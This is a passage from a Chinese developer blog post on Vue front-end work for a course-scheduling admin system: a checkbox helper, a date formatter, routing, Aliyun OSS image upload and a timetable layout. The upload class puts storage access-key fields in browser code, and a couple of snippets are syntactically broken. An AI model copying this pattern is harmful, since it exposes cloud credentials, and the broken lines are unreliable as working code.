class="line">                element.checked = <span class="literal">false</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取已选中的列表</span></span><br><span class="line">    <span class="function"><span class="title">getcheckedItemIdList</span>(<span class="params">itemId</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> itemIdList = [];</span><br><span class="line">        <span class="keyword">let</span> checkItems = <span class="built_in">document</span>.getElementsByName(<span class="built_in">this</span>.checkItemName);</span><br><span class="line">        checkItems.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (element.checked) &#123;</span><br><span class="line">                itemIdList.push(element.getAttribute(itemId));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> itemIdList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 默认导出类</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> SelectAllController</span><br></pre></td></tr></table></figure><p>在vue文件中，先import模块，再new生成实例，单后然后仅需为每个单选checkbox设置name值，为全选checkbox设置id值，再调用类的方法即可：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">checkItem</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.selectAllController.checkItem();</span><br><span class="line">&#125;,</span><br><span class="line"><span class="function"><span class="title">checkAll</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.selectAllController.checkAll();</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p>在src&gt;utils中创建dateFormatter.js文件，默认导出一个函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">formatDate</span>(<span class="params">fmt, date</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (date === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        a = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        a = <span class="keyword">new</span> <span class="built_in">Date</span>(date);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> o = &#123;</span><br><span class="line">        <span class="string">&quot;M+&quot;</span>: a.getMonth() + <span class="number">1</span>, <span class="comment">//月份</span></span><br><span class="line">        <span class="string">&quot;d+&quot;</span>: a.getDate(), <span class="comment">//日</span></span><br><span class="line">        <span class="string">&quot;h+&quot;</span>: a.getHours(), <span class="comment">//小时</span></span><br><span class="line">        <span class="string">&quot;m+&quot;</span>: a.getMinutes(), <span class="comment">//分</span></span><br><span class="line">        <span class="string">&quot;s+&quot;</span>: a.getSeconds(), <span class="comment">//秒</span></span><br><span class="line">        <span class="string">&quot;q+&quot;</span>: <span class="built_in">Math</span>.floor((a.getMonth() + <span class="number">3</span>) / <span class="number">3</span>), <span class="comment">//季度</span></span><br><span class="line">        <span class="attr">S</span>: a.getMilliseconds() <span class="comment">//毫秒</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/(y+)/</span>.test(fmt))</span><br><span class="line">        fmt = fmt.replace(<span class="built_in">RegExp</span>.$1,(a.getFullYear() + <span class="string">&quot;&quot;</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$1.length));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> o)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;(&quot;</span> + k + <span class="string">&quot;)&quot;</span>).test(fmt))</span><br><span class="line">            fmt = fmt.replace(<span class="built_in">RegExp</span>.$1,<span class="built_in">RegExp</span>.$1.length == <span class="number">1</span> ?o[k] :(<span class="string">&quot;00&quot;</span> + o[k]).substr((<span class="string">&quot;&quot;</span> + o[k]).length));</span><br><span class="line">    <span class="keyword">return</span> fmt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在vue文件中仅需导入后再自定义过滤器：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">filters: &#123;</span><br><span class="line">  <span class="function"><span class="title">dateFormat</span>(<span class="params">time</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>(time);</span><br><span class="line">    <span class="keyword">return</span> dateFormat(<span class="string">&quot;yyyy-MM-dd hh:mm&quot;</span>, date);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>使用：<code>&#123;&#123; item.beginTime | dateFormat &#125;&#125;</code></p></li></ol><h2 id="二、路由跳转"><a href="#二、路由跳转" class="headerlink" title="二、路由跳转"></a>二、路由跳转</h2><p>需要实现的需求为：点击课程页面的排课按钮，然后跳转到“课表”页面</p><p><img src="https://i.loli.net/2021/07/17/FrHqd3M98c2JLCw.jpg" alt="Snipaste_2021-07-17_22-02-21.jpg"></p><p>然而，由于顶上的<code>menu-bar</code>由components写死（具体不知道什么原因），无法通过vue-router直接跳转到对应url。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>为排课添加事件：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">arrangeSchedule</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.$router.push(&#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/index/blank&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>跳转到一个空白页面，然后在blank页面中通过路由导航进行页面跳转：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeRouteEnter</span>(<span class="params">to, <span class="keyword">from</span>, next</span>)</span> &#123;</span><br><span class="line">  next(<span class="function">(<span class="params">vm</span>) =&gt;</span> &#123;</span><br><span class="line">    vm.$router.replace(<span class="keyword">from</span>.path+<span class="string">&#x27;?page=by_schedule&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>因为blank页面与课表页面可以实现相互跳转。</p><h2 id="三、父子组件通信"><a href="#三、父子组件通信" class="headerlink" title="三、父子组件通信"></a>三、父子组件通信</h2><p>在对父组件内部的子组件进行修改后，点击确定需要实现</p><ul><li>关闭子组件对话框</li><li>得到实时修改数据并渲染</li></ul><p>通过props和$emit可以实现关闭对话框的功能，但是要得到数据必须调用父组件中的getList函数。最开始的想法是通过强制刷新父组件页面实现，但是这样会有较长时间白屏，影响用户体验。</p><h2 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h2><p>原来完全可以通过在子组件内<code>this.$parent.getTeacherList();</code>直接调用父组件的函数实现。</p><h2 id="四、图片的存储修改"><a href="#四、图片的存储修改" class="headerlink" title="四、图片的存储修改"></a>四、图片的存储修改</h2><p>为了对静态资源进行储存和修改，采用阿里云对象存储OSS。</p><p>所有代码都放入一个js文件中，vue文件若需要使用oss则导入就行。</p><h2 id="实现方案-1"><a href="#实现方案-1" class="headerlink" title="实现方案"></a>实现方案</h2><p>src&gt;utils&gt;oss.js:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> OSS <span class="keyword">from</span> <span class="string">&quot;ali-oss&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ECommunityOss</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.client = <span class="keyword">new</span> OSS(&#123;</span><br><span class="line">            <span class="attr">region</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">            <span class="attr">accessKeyId</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">            <span class="attr">accessKeySecret</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">            <span class="attr">bucket</span>: <span class="string">&quot;xxx&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* file:文件  uniqueKey:对象名称  progress:回调函数  expires:过期日期*/</span></span><br><span class="line">    <span class="function"><span class="title">asyncUpload</span>(<span class="params">file, uniqueKey, progress, expires</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.client.multipartUpload(uniqueKey, file, &#123;</span><br><span class="line">            progress,</span><br><span class="line">            <span class="attr">headers</span>: &#123;<span class="attr">Expires</span>: expires&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">getImgUrl</span>(<span class="params">uniqueKey</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.client.signatureUrl(uniqueKey);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">deleteImg</span>(<span class="params">uniqueKey</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.client.delete(uniqueKey);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">getPath</span>(<span class="params">fileName</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getImgUrl(fileName).split(<span class="string">&quot;?&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> ECommunityOss;</span><br></pre></td></tr></table></figure><p>在vue文件中：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>头像:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;img-item&quot;</span> <span class="attr">v-if</span>=<span class="string">&quot;data.businessLicensePic&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;img-wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;data.businessLicensePic&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">title</span>=<span class="string">&quot;点击查看放大图&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;delete-img&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;deleteImageInOss(data.businessLicensePic)&quot;</span>&gt;</span>删除图片<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;add-img&quot;</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;add-icon-wrapper&quot;</span> <span class="attr">title</span>=<span class="string">&quot;添加图片&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">        <span class="attr">type</span>=<span class="string">&quot;file&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">&quot;file-input&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">accept</span>=<span class="string">&quot;image/jpeg, image/png&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">change</span>=<span class="string">&quot;uploadImageToOss&quot;</span></span></span><br><span class="line"><span class="tag">      /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;img_label&quot;</span>&gt;</span>建议尺寸200*200px<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导入</span></span><br><span class="line"><span class="keyword">import</span> ECommunityOss <span class="keyword">from</span> <span class="string">&quot;@/utils/ecommunity-oss&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从Oss删除</span></span><br><span class="line"><span class="function"><span class="title">deleteImageInOss</span>(<span class="params">imgUrl</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> urlSplits = imgUrl.split(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> eCommunityOss = <span class="keyword">new</span> ECommunityOss();</span><br><span class="line">  eCommunityOss.deleteImg(urlSplits[urlSplits.length - <span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">this</span>.data.businessLicensePic = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">//上传到oss</span></span><br><span class="line"><span class="function"><span class="title">uploadImageToOss</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> file = e.target.files[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">const</span> self = <span class="built_in">this</span>;</span><br><span class="line">  <span class="keyword">const</span> eCommunityOss = <span class="keyword">new</span> ECommunityOss();</span><br><span class="line">  <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">const</span> uniqueKey = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime().toString();</span><br><span class="line">    <span class="keyword">const</span> progress = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">p</span>) </span>&#123;</span><br><span class="line">      self.uploadProgress =<span class="built_in">parseFloat</span>(p * <span class="number">100</span>).toFixed(<span class="number">2.</span>toString() + <span class="string">&quot;%&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    eCommunityOss.asyncUpload(file, uniqueKey, progress)</span><br><span class="line">      .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> imageUrl = eCommunityOss.getImgUrl(uniqueKey).split(<span class="string">&quot;?&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (imageUrl) &#123;</span><br><span class="line">          self.data.businessLicensePic = imageUrl;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">&quot;上传失败&quot;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">    </span><br><span class="line"><span class="comment">//第二种方法</span></span><br><span class="line"><span class="function"><span class="title">uploadImage</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.ossUploadFile(e)</span><br><span class="line">    .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(res);</span><br><span class="line">      <span class="built_in">this</span>.data.businessLicensePic.push(res);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="function"><span class="title">ossUploadFile</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> file = e.target.files[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">let</span> fr = <span class="keyword">new</span> FileReader();</span><br><span class="line">    <span class="keyword">let</span> self = <span class="built_in">this</span>;</span><br><span class="line">    <span class="built_in">this</span>.warning = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/image/</span>.test(file.type)) &#123;</span><br><span class="line">      <span class="built_in">this</span>.warning = <span class="string">&quot;只能上传后缀为gif,ico,png,jpg的图片文件&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fr.readAsDataURL(file);</span><br><span class="line">    <span class="keyword">let</span> oss = <span class="keyword">new</span> Oss();</span><br><span class="line">    <span class="keyword">let</span> fileName = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime().toString(); <span class="comment">//!!!</span></span><br><span class="line">    oss</span><br><span class="line">      .asyncUpload(file, fileName, <span class="function">() =&gt;</span> &#123;&#125;)</span><br><span class="line">      .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        resolve(oss.getImgUrl(fileName).split(<span class="string">&quot;?&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        reject(<span class="string">&quot;上传失败：&quot;</span> + err);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="function"><span class="title">deleteImage</span>(<span class="params">index</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.data.businessLicensePic.splice(index, <span class="number">1</span>);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="五、编辑时回显顺序"><a href="#五、编辑时回显顺序" class="headerlink" title="五、编辑时回显顺序"></a>五、编辑时回显顺序</h2><p>想实现点击编辑按钮，然后回显课程颜色。但是因为查询到课程颜色后，需要等获取DOM后再设置backgroundColor实现。</p><p><img src="https://i.loli.net/2021/07/24/pE9cLukMAyJPsob.jpg" alt="Snipaste_2021-07-24_15-46-39.jpg"></p><h2 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h2><p>通过 setInterval 异步方法，每过50ms判断有没有获取 dom 节点，若获取则通过 clearInterval 方法清除。具体代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">getClassDetail</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.$axios(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;/Ecommunity/lesson/queryLessonDetail&quot;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">      <span class="attr">lessonId</span>: <span class="built_in">this</span>.classId,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">    .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.editClassForm = res.data.data;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.editClassForm.buildings.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.buildingIds.push(<span class="built_in">this</span>.editClassForm.buildings[i].buildingId);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">this</span>.data.classCoverPic = <span class="built_in">this</span>.editClassForm.coverImageUrl;</span><br><span class="line">      <span class="built_in">this</span>.data.classDetailPic = <span class="built_in">this</span>.editClassForm.detailImageUrl;</span><br><span class="line">      <span class="built_in">this</span>.data.classHeadPic = <span class="built_in">this</span>.editClassForm.headImageUrl;</span><br><span class="line">      <span class="built_in">this</span>.data.classLogoPic = <span class="built_in">this</span>.editClassForm.iconImageUrl;</span><br><span class="line">      <span class="built_in">this</span>.defaultTeacher = res.data.data.defaultTeacherId;</span><br><span class="line">      <span class="built_in">this</span>.defaultColor = res.data.data.colorNameId;</span><br><span class="line">      <span class="comment">// 一直在微任务中循环，直到获取到 DOM 元素</span></span><br><span class="line">      <span class="keyword">var</span> a = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> obj = (<span class="built_in">document</span>.getElementById(<span class="string">&quot;rgb_span&quot;</span>).style.backgroundColor = <span class="string">&quot;#&quot;</span> + <span class="built_in">this</span>.</span><br><span class="line">        <span class="keyword">if</span> (obj) &#123;</span><br><span class="line">          <span class="built_in">clearInterval</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="六、课表模块页面布局"><a href="#六、课表模块页面布局" class="headerlink" title="六、课表模块页面布局"></a>六、课表模块页面布局</h2><p>说实话这一块卡了很久，不知道如何布局成课表形状（如下），最后是通过拿到数据后的双重循环实现的。</p><p><img src="https://i.loli.net/2021/07/24/nqATCVPdbpza5G3.png" alt="20210331124803519.png"></p><h2 id="实现方案-2"><a href="#实现方案-2" class="headerlink" title="实现方案"></a>实现方案</h2><p>html部分代码如下：<img src="https://i.loli.net/2021/07/24/MfCd9bEpRkuZx8D.png" alt="20210331125103944.png"></p><p>通过七个 classWeekList[i] i=0,1,…,6 实现。十分冗余。</p><p>最后data里的数据：<img src="https://i.loli.net/2021/07/24/IxF8KomSqGidO1H.jpg" alt="Snipaste_2021-07-24_16-01-30.jpg"></p><p>classDaylist 列表里的每一个对象需要初始值 id ，然后获取时便可赋值。</p><p>此外，还需将数据按上周日到这周六的顺序显示，在mounted中：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> nowData = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">  <span class="built_in">this</span>.parentMsg.year=nowData.getFullYear();</span><br><span class="line">  nowData.setHours(<span class="number">0</span>); <span class="comment">//设置小时</span></span><br><span class="line">  nowData.setMinutes(<span class="number">0</span>); <span class="comment">//设置分钟</span></span><br><span class="line">  nowData.setSeconds(<span class="number">0</span>); <span class="comment">//设置秒</span></span><br><span class="line">  nowData.setMilliseconds(<span class="number">0</span>); <span class="comment">//设置毫妙</span></span><br><span class="line">  <span class="comment">//获取今天的是周几</span></span><br><span class="line">  <span class="keyword">let</span> currentDay = nowData.getDay();</span><br><span class="line">  <span class="comment">//把currentDay == 0赋值给周日</span></span><br><span class="line">  <span class="keyword">if</span> (currentDay == <span class="number">0</span>) &#123;</span><br><span class="line">    currentDay = <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> sunDayTime = nowData.getTime() - currentDay * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> monDayTime = nowData.getTime() + (<span class="number">1</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> tueDayTime = nowData.getTime() + (<span class="number">2</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> wedDayTime = nowData.getTime() + (<span class="number">3</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> thuDayTime = nowData.getTime() + (<span class="number">4</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> friDayTime = nowData.getTime() + (<span class="number">5</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">let</span> satDayTime = nowData.getTime() + (<span class="number">6</span> - currentDay) * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">  <span class="built_in">this</span>.getMonthAndDay(</span><br><span class="line">    sunDayTime,</span><br><span class="line">    monDayTime,</span><br><span class="line">    tueDayTime,</span><br><span class="line">    wedDayTime,</span><br><span class="line">    thuDayTime,</span><br><span class="line">    friDayTime,</span><br><span class="line">    satDayTime</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">this</span>.getMultiClass();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义 getMonthAndDay 函数</span></span><br><span class="line"><span class="function"><span class="title">getMonthAndDay</span>(<span class="params"> sunDayTime, monDayTime, tueDayTime, wedDayTime, thuDayTime, friDayTime, satDayTime </span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 获取上周日的时间戳</span></span><br><span class="line">  <span class="built_in">this</span>.sunDayTime = sunDayTime;</span><br><span class="line">  <span class="built_in">this</span>.firstDay = <span class="keyword">new</span> <span class="built_in">Date</span>(sunDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.firstMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(sunDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 获取这周一的时间戳</span></span><br><span class="line">  <span class="built_in">this</span>.monDayTime = monDayTime;</span><br><span class="line">  <span class="built_in">this</span>.secondDay = <span class="keyword">new</span> <span class="built_in">Date</span>(monDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.secondMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(monDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 获取这周二的时间戳</span></span><br><span class="line">  <span class="built_in">this</span>.tueDayTime = tueDayTime;</span><br><span class="line">  <span class="built_in">this</span>.thirdDay = <span class="keyword">new</span> <span class="built_in">Date</span>(tueDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.thirdMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(tueDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 获取这周三的时间戳</span></span><br><span class="line">  <span class="built_in">this</span>.wedDayTime = wedDayTime;</span><br><span class="line">  <span class="built_in">this</span>.fourthDay = <span class="keyword">new</span> <span class="built_in">Date</span>(wedDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.fourthMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(wedDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 获取这周四的时间戳</span></span><br><span class="line">  <span class="built_in">this</span>.thuDayTime = thuDayTime;</span><br><span class="line">  <span class="built_in">this</span>.fifthDay = <span class="keyword">new</span> <span class="built_in">Date</span>(thuDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.fifthMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(thuDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 获取这周五的时间戳</span></span><br><span class="line">  <span class="built_in">this</span>.friDayTime = friDayTime;</span><br><span class="line">  <span class="built_in">this</span>.sixthDay = <span class="keyword">new</span> <span class="built_in">Date</span>(friDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.sixthMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(friDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 获取这周六的时间戳</span></span><br><span class="line">  <span class="built_in">this</span>.satDayTime = satDayTime;</span><br><span class="line">  <span class="built_in">this</span>.seventhDay = <span class="keyword">new</span> <span class="built_in">Date</span>(satDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.seventhMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(satDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>优化：将 24 * 60 * 60 * 1000 定义为常量，表示一天的时间戳长度</p><h2 id="七、显示课表数据："><a href="#七、显示课表数据：" class="headerlink" title="七、显示课表数据："></a>七、显示课表数据：</h2><p>由于接口返回的只是一周内已有的课程列表，并没有具体对应在第几天第几节。因此前端需要判断每节课在课表的位置。</p><h2 id="实现方案-3"><a href="#实现方案-3" class="headerlink" title="实现方案"></a>实现方案</h2><p>使用双重循环判断：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">getMultiClass</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.$axios(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;/Ecommunity/lesson/queryMultiLessonArrangement&quot;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">      <span class="comment">// 周日开始到周六为一周</span></span><br><span class="line">      <span class="attr">beginTime</span>: <span class="built_in">this</span>.sunDayTime,</span><br><span class="line">      <span class="attr">endTime</span>: <span 